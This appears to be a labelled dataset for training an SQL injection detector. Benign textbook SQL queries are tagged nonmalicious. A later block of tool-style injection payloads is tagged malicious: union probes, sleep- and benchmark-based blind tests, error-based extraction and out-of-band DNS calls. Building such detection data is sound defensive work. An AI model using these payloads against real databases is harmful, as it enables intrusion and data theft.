+__label__nonmalicious  SELECT SUM(Salary)FROM Employee WHERE Emp_Age < 30;
+__label__nonmalicious  SELECT AVG(Price)FROM Products;
+__label__nonmalicious  SELECT * FROM My_Schema.views;
+__label__nonmalicious  CREATE VIEW Failing_Students AS SELECT S_NAME, Student_ID FROM STUDENT WHERE GPA > 40;
+__label__nonmalicious  CREATE OR REPLACE VIEW [ Product List] AS SELECT ProductID, ProductName, Category FROM Products WHERE Discontinued = No;
+__label__nonmalicious  SELECT * FROM Sys.objects WHERE Type='u';
+__label__nonmalicious  SELECT * from Sys.Objects WHERE Type='PK';
+__label__nonmalicious  SELECT * FROM Sys.Objects WHERE Type='uq';
+__label__nonmalicious  SELECT * FROM Sys.Objects WHERE Type='f';
+__label__nonmalicious  SELECT * FROM Sys.Objects WHERE Type='tr';
+__label__nonmalicious  SELECT * FROM Sys.Objects WHERE Type='it';
+__label__nonmalicious  UPDATE Customers SET Zip=Phone, Phone=Zip;
+__label__nonmalicious  SELECT ID FROM Orders WHERE Date BETWEEN ‘01/12/2018’ AND ‘01/13/2018’;
+__label__nonmalicious  SELECT ID FROM Customers INNER JOIN Orders ON Customers.ID = Orders.ID;
+__label__nonmalicious  SELECT phone FROM Customers UNION SELECT item FROM Orders;
+__label__nonmalicious  SELECT Item FROM Orders WHERE id = ALL (SELECT ID FROM Orders WHERE quantity > 50);
+__label__nonmalicious  SELECT item FROM Orders WHERE date ALL = (SELECT Order_ID FROM Orders WHERE quantity > 50);
+__label__nonmalicious  ALTER TABLE Customers ADD Birthday varchar(80);
+__label__nonmalicious  ID int NOT NULL AUTO_INCREMENT;
+__label__nonmalicious  SELECT Name, Birthday, Phone, Address, Zip FROM Customers;
+__label__nonmalicious  SELECT Name FROM Customers WHERE EXISTS (SELECT Item FROM Orders WHERE Customers.ID = Orders.ID AND Price < 50);
+__label__nonmalicious  INSERT INTO Yearly_Orders SELECT * FROM Orders WHERE Date<=1/1/2018;
+__label__nonmalicious  SELECT Item, Price * (QtyInStock + IFNULL(QtyOnOrder, 0)) FROM Orders;
+__label__nonmalicious  SELECT COUNT(ID), Region FROM Customers GROUP BY Region HAVING COUNT(ID) > 0;
+__label__nonmalicious  Select * from Employee A where rownum <=8 union select * from (Select * from Employee A order by rowid desc) where rownum <=8;
+__label__nonmalicious  SELECT eno, empname, dtno, salary, MAX(salary) OVER () AS max_result FROM   employee;
+__label__nonmalicious  SELECT price FROM   sales_order ORDER BY price;
+__label__nonmalicious  SELECT prdid, SUM(amount), PERCENT_RANK() OVER (ORDER BY SUM(amount) DESC) AS percent_rank FROM sales GROUP BY prdid ORDER BY prdid;
+__label__nonmalicious  SELECT eno, empname, dtno, salary, MAX(salary) OVER () AS max_result FROM   employee
+__label__nonmalicious  SELECT price FROM   sales_order ORDER BY price;
+__label__nonmalicious  SELECT eno, dno, salary, AVG(salary) OVER () AS avg_sal FROM employee;
+__label__nonmalicious  SELECT eno, dno,salary, DENSE_RANK() OVER (PARTITION BY dno ORDER BY salary) AS ranking FROM employee;
+__label__nonmalicious  SELECT DISTINCT " column_name " FROM " table_name "
+__label__nonmalicious  SELECT DISTINCT Store_Name FROM Store_Information;
+__label__nonmalicious  SELECT Store_Name FROM Store_Information WHERE Sales > 1000;
+__label__nonmalicious  SELECT * FROM Store_Information WHERE Sales > 1000 OR Txn_Date = 'Jan-08-1999';
+__label__nonmalicious  SELECT * FROM Users WHERE Gender = 'M';
+__label__nonmalicious  SELECT Gender FROM Users WHERE Last_Name = 'Wilkes';
+__label__nonmalicious  SELECT * FROM Store_Information WHERE Txn_Date BETWEEN 'Jan-06-1999' AND 'Jan-10-1999';
+__label__nonmalicious  SELECT * FROM Store_Information WHERE Sales NOT BETWEEN 280 and 1000;
+__label__nonmalicious  SELECT * FROM Store_Information WHERE Store_Name IN ('Los Angeles', 'San Diego');
+__label__nonmalicious  SELECT Store_Name, Sales, Txn_Date FROM Store_Information ORDER BY 2 DESC;
+__label__nonmalicious  SELECT Store_Name FROM Store_Information ORDER BY Sales DESC;
+__label__nonmalicious  SELECT Product_ID, Price*Units Revenue FROM Product_Sales ORDER BY Price*Units DESC;
+__label__nonmalicious  SELECT Store_Name, SUM(Sales) FROM Store_Information GROUP BY Store_Name HAVING SUM(Sales) > 1500;
+__label__nonmalicious  SELECT Store_Name, SUM(Sales) FROM Store_Information GROUP BY Store_Name;
+__label__nonmalicious  SELECT Store_Name, Product_ID, SUM(Sales) FROM Store_Information GROUP BY Store_Name, Product_ID;
+__label__nonmalicious  SELECT Store_Name, Product_ID, SUM(Sales), AVG(Sales) FROM Store_Information GROUP BY Store_Name, Product_ID;
+__label__nonmalicious  SELECT Txn_Date, SUM(Sales)FROM Store_Information GROUP BY Txn_Date ORDER BY Txn_Date;
+__label__nonmalicious  SELECT A1.Store_Name Store, SUM(A1.Sales) "Total Sales" FROM Store_Information A1 GROUP BY A1.Store_Name;
+__label__nonmalicious  Select * from books where pageCount &gt; 200;
+__label__nonmalicious  Select * from books where pageCount between 100 and 200;
+__label__nonmalicious  Select top 1 * from books order by pageCount desc;
+__label__nonmalicious  Select * from books where pageCount= (Select max(pageCount) from books);
+__label__nonmalicious  Insert into authors(name,surname) Select top 5 name,surname from students order by newid();
+__label__nonmalicious  Insert into authors(name,surname) values('Ernest','Dowson'),('Mother','Goose') Or Insert into authors values ('Ernest','Dowson'),('Mother','Goose');
+__label__nonmalicious  Select DateName(mm,birthdate) as MName,count(*) as Count  from students group by DATEName(mm,birthdate);
+__label__nonmalicious  Select DateName(mm,birthdate) as MName,count(*) as Count  from students group by DATEName(mm,birthdate) order by Count;
+__label__nonmalicious  Select DateName(mm,birthdate) as MName,count(*) as Count  from students where gender = 'M' group by DATEName(mm,birthdate) order by Count;
+__label__nonmalicious  Select DATENAME(mm,takenDate) as Months,count(*) as Count from borrows group by DATENAME(mm,takenDate);
+__label__nonmalicious  Select DATENAME(mm,takenDate) as Months,count(*) as BookCount from borrows group by DATENAME(mm,takenDate) order by BookCount;
+__label__nonmalicious  Select DATENAME(mm,takenDate) as Months,count(*) as BookCount from borrows group by DATENAME(mm,takenDate) order by 2;
+__label__nonmalicious  Select DATENAME(mm,takenDate) as Months,count(*) as BookCount from borrows where year(takenDate) = 2015 group by DATENAME(mm,takenDate) order by BookCount;
+__label__nonmalicious  Select DATENAME(mm,takenDate) as Months,count(*) as BookCount from borrows where year(takenDate) = 2015 group by DATENAME(mm,takenDate) having count(*)>100 order by BookCount;
+__label__nonmalicious  Select FIRST_NAME AS WORKER_NAME from Worker;
+__label__nonmalicious  Select upper(FIRST_NAME) from Worker;
+__label__nonmalicious  Select substring(FIRST_NAME,1,3) from Worker;
+__label__nonmalicious  Select CONCAT(FIRST_NAME, ' ', LAST_NAME) AS 'COMPLETE_NAME' from Worker;
+__label__nonmalicious  Select * from Worker where FIRST_NAME in ('NIHARIKA','PRIYANSHA');
+__label__nonmalicious  Select * from Worker where FIRST_NAME not in ('NIHARIKA','PRYANSHA');
+__label__nonmalicious  Select * from Worker where DEPARTMENT like 'Admin%';
+__label__nonmalicious  Select * from Worker where year(JOINING_DATE) = 2014 and month(JOINING_DATE) = 2;
+__label__nonmalicious  SELECT COUNT(*) FROM worker WHERE DEPARTMENT = 'Admin';
+__label__nonmalicious  SELECT CONCAT(FIRST_NAME, ' ', LAST_NAME) As Worker_Name, Salary FROM worker
+__label__nonmalicious  WHERE WORKER_ID IN (SELECT WORKER_ID FROM worker WHERE Salary BETWEEN 5000 AND 10000);
+__label__nonmalicious  SELECT DEPARTMENT, count(WORKER_ID) No_Of_Workers FROM worker GROUP BY DEPARTMENT ORDER BY No_Of_Workers DESC;
+__label__nonmalicious  SELECT * FROM Worker WHERE MOD (WORKER_ID, 2) <> 0;
+__label__nonmalicious  SELECT * FROM Worker WHERE MOD (WORKER_ID, 2) = 0;
+__label__nonmalicious  SELECT * INTO WorkerClone FROM Worker;
+__label__nonmalicious  SELECT * INTO WorkerClone FROM Worker WHERE 1 = 0;
+__label__nonmalicious  SELECT * FROM Worker MINUS SELECT * FROM Title;
+__label__nonmalicious  SELECT DISTINCT W.FIRST_NAME, T.WORKER_TITLE FROM Worker W INNER JOIN Title T ON W.WORKER_ID = T.WORKER_REF_ID AND T.WORKER_TITLE in ('Manager');
+__label__nonmalicious  SELECT * FROM Developers WHERE Country='India' AND City='Delhi';
+__label__nonmalicious  SELECT * FROM Developers WHERE City='London' OR City='Paris';
+__label__nonmalicious  ALTER TABLE Developers ADD BirthDate date;
+__label__nonmalicious  ALTER TABLE Developers DROP COLUMN BirthDate;
+__label__nonmalicious  SELECT ID as developerID, Name AS developers FROM develop;
+__label__nonmalicious  SELECT o.ID, c.Name FROM Customers AS c, Customer_orders AS o WHERE c.id = 2 AND c.ID = o.customer_id;
+__label__nonmalicious  SELECT * FROM Orders WHERE Price BETWEEN 10 AND 15;
+__label__nonmalicious  CREATE DATABASE developers;
+__label__nonmalicious  CREATE TABLE Suppliers (SupplierID int,FirstName varchar(255),LastName varchar(255),City varchar(255),Country varchar(255));
+__label__nonmalicious  CREATE INDEX idx_lastname ON Persons (LastName);
+__label__nonmalicious  DELETE FROM Developers WHERE Name='Antonio Indigo';
+__label__nonmalicious  DELETE * FROM Developers;
+__label__nonmalicious  GRANT SELECT, UPDATE ON YOUR_TABLE TO FIRST_USER, SECOND_USER;
+__label__nonmalicious  REVOKE SELECT, UPDATE ON YOUR_TABLE FROM FIRST_USER, SECOND_USER;
+__label__nonmalicious  DELETE FROM CUSTOMERS WHERE AGE = 18;  
+__label__nonmalicious  DROP DATABASE db_name
+__label__nonmalicious  ALTER TABLE tbl_name DROP INDEX indx_name
+__label__nonmalicious  SELECT id, name FROM Developers;
+__label__nonmalicious  WHERE EXISTS (SELECT id FROM developers_orders WHERE developers_orders.customer_id=customers.id AND developers.city = "Rome");
+__label__nonmalicious  SELECT COUNT(ID), City FROM Developers GROUP BY City;
+__label__nonmalicious  SELECT * FROM Developers WHERE Country IN ('USA', 'France', 'India');
+__label__nonmalicious  SELECT COUNT(ID), Country FROM Pets GROUP BY Country HAVING COUNT(ID) > 2;
+__label__nonmalicious  SELECT * FROM Developers WHERE Country IN ('USA', 'France', 'India');
+__label__nonmalicious  INSERT INTO Developers (Name, City, Country) VALUES ('Luke Christon', 'London', 'UK');
+__label__nonmalicious  SELECT Orders.ID, Developers.Name FROM Orders INNER JOIN Developers ON Orders.ID = Developers.ID; SELECT Orders.ID, Developers.Name FROM Orders INNER JOIN Developers ON Orders.ID = Developers.ID;
+__label__nonmalicious  SELECT Customer_orders.ID, Employees.Last_name, Employees.First_name FROM Customer_orders RIGHT JOIN Employees ON Customer_orders.employee_id = Employees.ID ORDER BY Customer_orders.ID;
+__label__nonmalicious  SELECT * FROM users WHERE email LIKE '%gmail%';
+__label__nonmalicious  SELECT * FROM users ORDER BY email DESC;
+__label__nonmalicious  SELECT username,email FROM users;
+__label__nonmalicious  SELECT DISTINCT City FROM Developers;
+__label__nonmalicious  SELECT * INTO CustomerBackup2018 FROM developers;
+__label__nonmalicious  SELECT * FROM developers LIMIT 3;
+__label__nonmalicious  SELECT * FROM developers LIMIT 3;
+__label__nonmalicious  SELECT * FROM Developers WHERE Country='France';
+__label__nonmalicious  SELECT * FROM Customers WHERE Last_Name='Smith';
+__label__nonmalicious  SELECT Cust_No, First_Name FROM Customers WHERE Last_Name='Smith';
+__label__nonmalicious  SELECT First_Name, Nickname FROM Friends WHERE Nickname LIKE '%brain%';
+__label__nonmalicious  SELECT * FROM Friends WHERE First_Name LIKE '_en';
+__label__nonmalicious  SELECT Student_ID FROM STUDENT;
+__label__nonmalicious  SELECT * FROM My_Schema.Tables;
+__label__nonmalicious  SELECT * FROM STUDENT;
+__label__nonmalicious  SELECT EMP_ID, NAME FROM EMPLOYEE_TBL WHERE EMP_ID = '0000'
+__label__nonmalicious  SELECT EMP_ID, LAST_NAME FROM EMPLOYEE WHERE CITY = 'Seattle' ORDER BY EMP_ID;
+__label__nonmalicious  SELECT EMP_ID, LAST_NAME FROM EMPLOYEE_TBL WHERE CITY = 'INDIANAPOLIS' ORDER BY EMP_ID asc;
+__label__nonmalicious  SELECT Name, Age FROM Patients WHERE Age > 40 GROUP BY Age ORDER BY Name;
+__label__nonmalicious  SELECT COUNT(developerID), Country FROM developer GROUP BY Country;
+__label__nonmalicious  SELECT SUM(Salary)FROM Employee WHERE Emp_Age < 30;
+__label__nonmalicious  SELECT AVG(Price)FROM orders;
+__label__nonmalicious  SELECT AVG(Price)FROM Products;
+__label__nonmalicious  SELECT * FROM Failing_Students;
+__label__nonmalicious  DROP VIEW V1;
+__label__nonmalicious  SELECT * FROM Sys.objects WHERE Type='u'
+__label__nonmalicious  SELECT * from Sys.Objects WHERE Type='PK'
+__label__nonmalicious  SELECT * FROM Sys.Objects WHERE Type='uq'
+__label__nonmalicious  SELECT * FROM Sys.Objects WHERE Type='f'
+__label__nonmalicious  UPDATE Customers SET Zip=Phone, Phone=Zip
+__label__nonmalicious  SELECT DISTINCT ID FROM Cakes
+__label__nonmalicious  SELECT * From cakes WHERE Name LIKE 'Herb%'
+__label__nonmalicious  SELECT ID FROM Orders WHERE Date BETWEEN â€ک01/12/2018â€™ AND â€ک01/13/2018â€™
+__label__nonmalicious  INSERT INTO STATION VALUES (13, 'Phoenix', 'AZ', 33, 112); 
+__label__nonmalicious  INSERT INTO STATION VALUES (44, 'Denver', 'CO', 40, 105); 
+__label__nonmalicious  INSERT INTO STATION VALUES (66, 'Caribou', 'ME', 47, 68);
+__label__nonmalicious  CREATE TABLE STATION (ID INTEGER PRIMARY KEY, CITY CHAR(20), STATE CHAR(2), LAT_N REAL, LONG_W REAL);
+__label__nonmalicious  SELECT * FROM STATION;
+__label__nonmalicious  SELECT * FROM STATION WHERE LAT_N > 39.7;
+__label__nonmalicious  CREATE TABLE STATS (ID INTEGER REFERENCES STATION(ID), MONTH INTEGER CHECK(MONTH BETWEEN 1 AND 12), TEMP_F REAL CHECK (TEMP_F BETWEEN -80 AND 150), RAIN_I REAL CHECK (RAIN_I BETWEEN 0 AND 100), PRIMARY KEY (ID, MONTH));
+__label__nonmalicious  INSERT INTO STATS VALUES (13, 1, 57.4, 0.31); 
+__label__nonmalicious  INSERT INTO STATS VALUES (13, 7, 91.7, 5.15); 
+__label__nonmalicious  INSERT INTO STATS VALUES (44, 1, 27.3, 0.18); 
+__label__nonmalicious  INSERT INTO STATS VALUES (44, 7, 74.8, 2.11); 
+__label__nonmalicious  INSERT INTO STATS VALUES (66, 1, 6.7, 2.10); 
+__label__nonmalicious  INSERT INTO STATS VALUES (66, 7, 65.8, 4.52);
+__label__nonmalicious  SELECT * FROM STATS;
+__label__nonmalicious  SELECT * FROM STATION, STATS WHERE STATION.ID = STATS.ID 
+__label__nonmalicious  SELECT MONTH, ID, RAIN_I, TEMP_F FROM STATS ORDER BY MONTH, RAIN_I DESC;
+__label__nonmalicious  SELECT LAT_N, CITY, TEMP_F FROM STATS, STATION WHERE MONTH = 7 AND STATS.ID =STATION.ID ORDER BY TEMP_F;
+__label__nonmalicious  SELECT MAX(TEMP_F), MIN(TEMP_F), AVG(RAIN_I), ID FROM STATS GROUP BY ID;
+__label__nonmalicious  SELECT * FROM STATION WHERE 50 < (SELECT AVG(TEMP_F) FROM STATS WHERE STATION.ID = STATS.ID);
+__label__nonmalicious  UPDATE STATS SET RAIN_I = 4.50 WHERE ID = 44 AND MONTH = 7;
+__label__nonmalicious  SELECT Item, Price *(QtyInStock + IFNULL(QtyOnOrder, 0))FROM Orders
+__label__nonmalicious  SELECT COUNT(ID), Region FROM Customers GROUP BY Region HAVING COUNT(ID) > 0;
+__label__nonmalicious  SELECT SUBSTRING_INDEX("medium.com/gumare64", ".", 2);
+__label__nonmalicious  DELETE FROM STATS WHERE MONTH = 7 OR ID IN (SELECT ID FROM STATION WHERE LONG_W < 90);
+__label__nonmalicious  DELETE FROM STATION WHERE LONG_W < 90;
+__label__nonmalicious  INSERT INTO STATS VALUES (33,8,27.4,.19);
+__label__nonmalicious  UPDATE STATS SET TEMP_F = -100 WHERE ID = 44 AND MONTH = 1;
+__label__nonmalicious  INSERT INTO STATS VALUES (44,8,27.4,-.03);
+__label__nonmalicious  INSERT INTO STATS VALUES (44,13,27.4,.19);
+__label__nonmalicious  SELECT A1.Store_Name Store, SUM(A1.Sales) "Total Sales" FROM Store_Information A1 GROUP BY A1.Store_Name;
+__label__nonmalicious  SELECT Txn_Date FROM Store_Information INTERSECT SELECT Txn_Date FROM Internet_Sales;
+__label__nonmalicious  SELECT TOP 2 Store_Name, Sales, Txn_Date FROM Store_Information  ORDER BY Sales DESC;
+__label__nonmalicious  SELECT TOP 25 PERCENT Store_Name, Sales, Txn_Date FROM Store_Information ORDER BY Sales DESC;
+__label__nonmalicious  SELECT A1.Store_Name STORE, SUM(A2.Sales) SALES FROM Geography A1 INNER JOIN Store_Information A2 ON A1.Store_Name = A2.Store_Name GROUP BY A1.Store_Name;
+__label__nonmalicious  SELECT TOP 2 Store_Name, Sales, Txn_Date FROM Store_Information ORDER BY Sales DESC
+__label__nonmalicious  SELECT a1.* FROM Store_Sales a1 WHERE a1.Sales > (SELECT AVG(Sales) AVG_SALES FROM Store_Sales);
+__label__nonmalicious  SELECT SUM(Sales) FROM Store_Information WHERE EXISTS (SELECT * FROM Geography WHERE Region_Name = 'West');
+__label__nonmalicious  UPDATE Store_Information SET Sales = 500 WHERE Store_Name = 'Los Angeles' AND Txn_Date = 'Jan-08-1999';
+__label__nonmalicious  UPDATE Store_Information SET Sales = 600, Txn_Date = 'Jan-15-1999' WHERE Store_Name = 'San Diego';
+__label__nonmalicious  SELECT Store_Name, CASE Store_Name WHEN 'Los Angeles' THEN Sales * 2  WHEN 'San Diego' THEN Sales * 1.5 ELSE Sales END "New Sales", Txn_Date FROM Store_Information;
+__label__nonmalicious  SELECT Txn_Date FROM Store_Information UNION SELECT Txn_Date FROM Internet_Sales;
+__label__nonmalicious  SELECT A1.Store_Name STORE1, A2.Store_Name STORE2, A2.Sales SALES FROM Geography A1 JOIN Store_Information A2;
+__label__nonmalicious  SELECT A1.store_name STORE1, A2.store_name STORE2, A2.Sales SALES FROM Geography A1, Store_Information A2;
+__label__nonmalicious  SELECT A1.Store_Name Store, SUM(A1.Sales) AS "Total Sales" FROM Store_Information AS A1 GROUP BY A1.Store_Name;
+__label__nonmalicious  SELECT A1.Store_Name, SUM(A2.Sales) SALES FROM Geography A1, Store_Information A2 WHERE A1.Store_Name = A2.Store_Name (+) GROUP BY A1.Store_Name;
+__label__malicious  1%' and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and '%' = '
+__label__malicious  -5903%"  )  )   )  or 3038 = 3038
+__label__malicious  -2174'  )  )   as zhoz where 4185 = 4185 order by 1#
+__label__malicious  -8661" union all select 5731,5731--
+__label__malicious  1' and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and 'rpiz' like 'rpiz
+__label__malicious  select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (  7749 = 7749
+__label__malicious  -5211 union all select 1754--
+__label__malicious  select  ( case when  ( 9299 = 2760 )  then 1 else 9299* ( select 9299 from master..sysdatabases )  end ) --
+__label__malicious  -3433' )  where 8307 = 8307 union all select 8307,8307,8307,8307,8307,8307,8307,8307--
+__label__malicious  1" )  where 1107 = 1107 and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --
+__label__malicious  1" )  as jask where 7629 = 7629 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --
+__label__malicious   select * from users where id = 1 or "{ ) " or 1 = 1 -- 1
+__label__malicious  1'  )  )   )  and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (   ( 'swfj' like 'swfj
+__label__malicious  1' and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and 'egye' = 'egye
+__label__malicious  1'  )  )   )  and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (   ( 'iuki' = 'iuki
+__label__malicious  1%' )  rlike  ( select  ( case when  ( 1210 = 8664 )  then 1 else 0x28 end  )  )   and  ( '%' = '
+__label__malicious  select  ( case when  ( 5914 = 2314 )  then 5914 else 1/ ( select 0 )  end ) --
+__label__malicious  -9263' )  as qodg where 6798 = 6798 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --
+__label__malicious  1' )  as upgb where 2031 = 2031
+__label__malicious  select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  (  'vjdk' like 'vjdk
+__label__malicious  -9711'+ ( select 'ckpj' where 8338 = 8338 union all select 8338--
+__label__malicious  select count ( * )  from generate_series ( 1,5000000 )  and  ( "%" = "
+__label__malicious  1'  )  )   union all select null,null,null,null,null,null,null,null#
+__label__malicious  1'+ ( select 'hjku' where 1954 = 1954 and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno  )  )  +'
+__label__malicious  1 and make_set ( 8403 = 8403,8899 ) # zysq
+__label__malicious  1 )  and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) 
+__label__malicious  1"  )  )   union all select null--
+__label__malicious  select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'vhvh' = 'vhvh
+__label__malicious   select * from users where id = 1 % ( @ )  or 1 = 1 -- 1
+__label__malicious  1%" )  or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and  ( "%" = "
+__label__malicious  1' and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  
+__label__malicious  1' )  where 2974 = 2974 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  --
+__label__malicious  1%'  )  )   )  and sleep ( 5 )  and   (  (   ( '%' = '
+__label__malicious  -3750'+ ( select alpu where 3911 = 3911 order by 1--
+__label__malicious  1'|| ( select 'skds' from dual where 8594 = 8594 and make_set ( 6779 = 2027,2027  )  )  ||'
+__label__malicious  -4785"  )  )   )  or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #
+__label__malicious  -8034" or 8571 = 8571--
+__label__malicious  -7971' union all select 4273#
+__label__malicious  iif ( 1095 = 2853,1,1/0 ) 
+__label__malicious  1'|| ( select 'ghby' from dual where 4854 = 4854
+__label__malicious  1%' )  or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --
+__label__malicious  -1628" union all select 9189,9189,9189,9189,9189,9189,9189,9189,9189--
+__label__malicious  select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  (  "tbcc" = "tbcc
+__label__malicious  -9007 )  as gill where 6462 = 6462 union all select 6462,6462,6462,6462,6462,6462,6462,6462,6462#
+__label__malicious  1' )  as syer where 3141 = 3141 rlike  ( select  ( case when  ( 6233 = 7567 )  then 1 else 0x28 end  )  )  --
+__label__malicious  1 )  as otsb where 8380 = 8380 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --
+__label__malicious  1" )  and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and  ( "wfwg" like "wfwg
+__label__malicious  1" or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --
+__label__malicious  -7859 )  as ipdg where 4413 = 4413 or 9323 = 9323#
+__label__malicious  1 )  or 7417 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --
+__label__malicious  1' )  and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and  ( 'mptm' = 'mptm
+__label__malicious  1 where 1842 = 1842 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #
+__label__malicious  1' in boolean mode )  and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --
+__label__malicious  1' where 8945 = 8945 and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --
+__label__malicious  -6951" union all select 2518,2518,2518,2518,2518,2518,2518,2518--
+__label__malicious  -7175' or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and 'upzo' = 'upzo
+__label__malicious  1" )  as pwvu where 8267 = 8267
+__label__malicious  -9057" )  or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #
+__label__malicious  1'  )  )   )  or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #
+__label__malicious  1' )  as vlwh where 9403 = 9403 or elt ( 5873 = 5873,sleep ( 5  )  )  #
+__label__malicious  1%'  )  )   and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --
+__label__malicious  -5585%'  )  )   )  or 6990 = 7727
+__label__malicious  1" union all select null,null,null--
+__label__malicious  1" )  and make_set ( 8403 = 8403,8899 )  and  ( "akha" like "akha
+__label__malicious  1"  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users ) 
+__label__malicious  -4927'  )  )   union all select 1924,1924#
+__label__malicious  1"  )  )   and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (  "bcxh" like "bcxh
+__label__malicious  1"  )  )   as yosd where 1255 = 1255
+__label__malicious  select  ( case when  ( 2783 = 9216 )  then 1 else 2783* ( select 2783 from master..sysdatabases )  end ) --
+__label__malicious  1  )  )   )  and 9575 = 1640--
+__label__malicious  -5643'  )  )   union all select 1515,1515#
+__label__malicious  1" )  as mwja where 7881 = 7881 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --
+__label__malicious  1' )  and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and  ( 'lwrk' like 'lwrk
+__label__malicious  1" )  rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and  ( "kxws" like "kxws
+__label__malicious  1 )  and 6969 =  ( select 6969 from pg_sleep ( 5  )  )  
+__label__malicious  1" )  and 2006 = 2006
+__label__malicious  -8233' or 9538 = 1882#
+__label__malicious  1"  )  )   as nsbu where 6569 = 6569 or sleep ( 5 ) #
+__label__malicious  1" and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --
+__label__malicious  1'|| ( select 'nfgq' where 1837 = 1837 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --
